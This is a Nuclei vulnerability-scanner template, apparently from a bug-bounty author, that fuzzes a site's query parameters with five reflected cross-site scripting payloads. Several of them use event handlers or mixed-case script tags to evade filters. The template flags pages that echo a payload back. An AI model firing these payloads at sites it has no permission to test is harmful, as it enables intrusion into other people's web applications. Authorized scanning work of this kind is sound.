id: Nawab_Xss ⚡
info:
  name: ⚡ Nawab-Confirmed-XSS ⚡
  author: thenawabx
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    payloads:
      xss_payloads:
        - "<video><source/onerror=confirm(1)>"
        - "<body/onpageshow=alert?.(1)>"
        - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
        - "<script>alert(\"Hacked\")</script>"
        - "<ScRipt>alert(\"Hacked\")</ScRipt>"
    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{xss_payloads}}"
    matchers:
      - type: word
        part: body
        words:
          - "<video><source/onerror=confirm(1)>"
          - "<body/onpageshow=alert?.(1)>"
          - "<iframe/srcdoc=\"<svg/onload=confirm(1)>\">"
          - "<script>alert(\"Hacked\")</script>"
          - "<ScRipt>alert(\"Hacked\")</ScRipt>"
        condition: or
    extractors:
      - type: kval
        name: FOUND_PAYLOAD
        kval:
          - xss_payloads
